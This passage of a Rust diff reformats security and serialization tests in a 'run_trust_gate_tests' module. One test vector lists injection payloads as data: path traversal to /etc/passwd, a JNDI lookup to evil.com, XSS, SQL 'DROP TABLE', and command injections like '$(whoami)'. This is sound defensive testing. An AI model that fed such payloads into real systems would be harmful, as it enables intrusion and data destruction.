                 let hex_decoded = hex::decode(&hex_encoded).expect("Large hex should decode");
                 assert_eq!(large_data, hex_decoded, "Large hex should round-trip");
@@ -19481,10 +19676,14 @@ mod run_trust_gate_tests {
                 let b64_encoded = BASE64_STANDARD.encode(&large_data);
                 let b64_duration = start.elapsed();
 
-                assert!(b64_duration.as_millis() < 1000,
-                       "Base64 encoding {} bytes should be fast", size);
+                assert!(
+                    b64_duration.as_millis() < 1000,
+                    "Base64 encoding {} bytes should be fast",
+                    size
+                );
 
-                let b64_decoded = BASE64_STANDARD.decode(&b64_encoded)
+                let b64_decoded = BASE64_STANDARD
+                    .decode(&b64_encoded)
                     .expect("Large base64 should decode");
                 assert_eq!(large_data, b64_decoded, "Large base64 should round-trip");
             }
@@ -19494,19 +19693,19 @@ mod run_trust_gate_tests {
         fn test_cli_structure_validation_and_injection_resistance() {
             // Attack 1: String field injection resistance testing
             let malicious_strings = vec![
-                "".to_string(),                                    // Empty
-                String::from_utf8_lossy(&[0x00, 0x01, 0xFF]).to_string(),                       // Binary data
-                "../../etc/passwd".to_string(),                   // Path traversal
-                "${jndi:ldap://evil.com}".to_string(),           // JNDI injection
-                "<script>alert('xss')</script>".to_string(),      // XSS
-                "'; DROP TABLE users; --".to_string(),            // SQL injection
-                "\n\r\t\x1b[31mCOLOR\x1b[0m".to_string(),       // Control chars + ANSI
-                "🦀".repeat(1000),                                // Large Unicode
-                "test with\nnewlines\rand\ttabs".to_string(),     // Multiline
-                "|echo pwned".to_string(),                        // Command injection
-                "$(whoami)".to_string(),                          // Command substitution
-                "`id`".to_string(),                              // Command substitution
-                "normal_value".to_string(),                       // Normal case
+                "".to_string(),                                           // Empty
+                String::from_utf8_lossy(&[0x00, 0x01, 0xFF]).to_string(), // Binary data
+                "../../etc/passwd".to_string(),                           // Path traversal
+                "${jndi:ldap://evil.com}".to_string(),                    // JNDI injection
+                "<script>alert('xss')</script>".to_string(),              // XSS
+                "'; DROP TABLE users; --".to_string(),                    // SQL injection
+                "\n\r\t\x1b[31mCOLOR\x1b[0m".to_string(),                 // Control chars + ANSI
+                "🦀".repeat(1000),                                        // Large Unicode
+                "test with\nnewlines\rand\ttabs".to_string(),             // Multiline
+                "|echo pwned".to_string(),                                // Command injection
+                "$(whoami)".to_string(),                                  // Command substitution
+                "`id`".to_string(),                                       // Command substitution
+                "normal_value".to_string(),                               // Normal case
             ];
 
             // Test PathBuf handling with malicious paths
@@ -19514,8 +19713,12 @@ mod run_trust_gate_tests {
                 let path = PathBuf::from(malicious_str);
 
                 // PathBuf should handle malicious strings safely
-                assert_eq!(path.to_string_lossy(), *malicious_str,
-                          "PathBuf {} should preserve string content", i);
+                assert_eq!(
+                    path.to_string_lossy(),
+                    *malicious_str,
+                    "PathBuf {} should preserve string content",
+                    i
+                );
 
                 // Test path operations don't cause issues
                 let _parent = path.parent();
@@ -19526,12 +19729,7 @@ mod run_trust_gate_tests {
             }
 
             // Attack 2: Option<T> field manipulation
-            let option_test_values = vec![
-                Some(0u64),
-                Some(u64::MAX),
-                Some(42),
-                None,
-            ];
+            let option_test_values = vec![Some(0u64), Some(u64::MAX), Some(42), None];
 
             for option_val in option_test_values {
                 // Test serialization of Option fields
@@ -19548,8 +19746,11 @@ mod run_trust_gate_tests {
                 };
 
                 let serialization = serde_json::to_string(&test_output);
-                assert!(serialization.is_ok(),
-                       "Option value {:?} should serialize", option_val);
+                assert!(
+                    serialization.is_ok(),
+                    "Option value {:?} should serialize",
+                    option_val
+                );
             }
 
             // Attack 3: Numeric field boundary testing
@@ -19575,12 +19776,14 @@ mod run_trust_gate_tests {
                 };
 
                 // Should handle extreme exit codes
-                assert_eq!(output_with_exit_code.exit_code, value,
-                          "{} should be preserved", description);
+                assert_eq!(
+                    output_with_exit_code.exit_code, value,
+                    "{} should be preserved",
+                    description
+                );
 
                 let serialization = serde_json::to_string(&output_with_exit_code);
-                assert!(serialization.is_ok(),
-                       "{} should serialize", description);
+                assert!(serialization.is_ok(), "{} should serialize", description);
             }
 
             // Attack 4: JSON Value field injection through details
@@ -19622,21 +19825,28 @@ mod run_trust_gate_tests {
                 };
 
                 let serialization = serde_json::to_string(&output_with_details);
-                assert!(serialization.is_ok(),
-                       "Details injection test {} should serialize", i);
+                assert!(
+                    serialization.is_ok(),
+                    "Details injection test {} should serialize",
+                    i
+                );
 
                 if let Some(ref detail_value) = details {
                     let json_str = serialization.unwrap();
 
                     // Verify details are properly nested and escaped
-                    assert!(json_str.contains("\"details\":"),
-                           "Details field should be present in JSON");
+                    assert!(
+                        json_str.contains("\"details\":"),
+                        "Details field should be present in JSON"
+                    );
 
                     // Should not contain unescaped injection attempts
                     if detail_value.is_object() {
                         // Complex objects should be properly serialized
-                        assert!(!json_str.contains("\"malicious\":\"../../../etc/passwd\"details\":"),
-                               "JSON structure should not be corrupted by injection");
+                        assert!(
+                            !json_str.contains("\"malicious\":\"../../../etc/passwd\"details\":"),
+                            "JSON structure should not be corrupted by injection"
+                        );
                     }
                 }
             }
@@ -19667,19 +19877,30 @@ mod run_trust_gate_tests {
 
             for (i, nested_struct) in nested_structures.iter().enumerate() {
                 let serialization = serde_json::to_string(nested_struct);
-                assert!(serialization.is_ok(),
-                       "Nested structure {} should serialize", i);
+                assert!(
+                    serialization.is_ok(),
+                    "Nested structure {} should serialize",
+                    i
+                );
 
                 let json_str = serialization.unwrap();
-                let deserialization: Result<RunDependencyTrustResult, _> = serde_json::from_str(&json_str);
-                assert!(deserialization.is_ok(),
-                       "Nested structure {} should deserialize", i);
+                let deserialization: Result<RunDependencyTrustResult, _> =
+                    serde_json::from_str(&json_str);
+                assert!(
+                    deserialization.is_ok(),
+                    "Nested structure {} should deserialize",
+                    i
+                );
 
                 let deserialized = deserialization.unwrap();
-                assert_eq!(nested_struct.dependency_name, deserialized.dependency_name,
-                          "Dependency name should be preserved");
-                assert_eq!(nested_struct.status, deserialized.status,
-                          "Status should be preserved");
+                assert_eq!(
+                    nested_struct.dependency_name, deserialized.dependency_name,
+                    "Dependency name should be preserved"
+                );
+                assert_eq!(
+                    nested_struct.status, deserialized.status,
+                    "Status should be preserved"
+                );
             }
         }
     }
